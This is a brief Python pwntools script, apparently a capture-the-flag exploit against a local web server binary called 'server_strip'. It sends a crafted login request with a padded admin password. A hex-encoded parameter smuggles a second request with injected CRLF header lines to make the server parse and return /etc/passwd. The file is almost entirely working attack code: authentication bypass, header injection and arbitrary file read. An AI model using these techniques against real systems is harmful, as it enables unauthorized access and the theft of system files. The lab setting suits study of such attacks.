from pwn import *
import sys
import requests
if len(sys.argv) < 2:
	p = process("./server_strip")

def debugf():
	gdb.attach(p,"b *0x402B21\nb *0x402bf2\nb *0x402DDA")

headers = {"Credentials":"LG GRAM"}
payload = "admin" + "a"*(0x40-5-5) + "nimda"
requests.get('http://127.0.0.1:8080/login.html?username=admin&password=adminaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaanimda&menu=request&para=6c6f67696e2e68746d6c3f757365726e616d653d61646d696e2670617373776f72643d61646d696e6161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616e696d6461266d656e753d706172736566696c6526706172613d2f6574632f7061737377640d0a43726564656e7469616c733a204c47204752414d0d0a4141413a'.format(pas=payload))#,headers=headers)
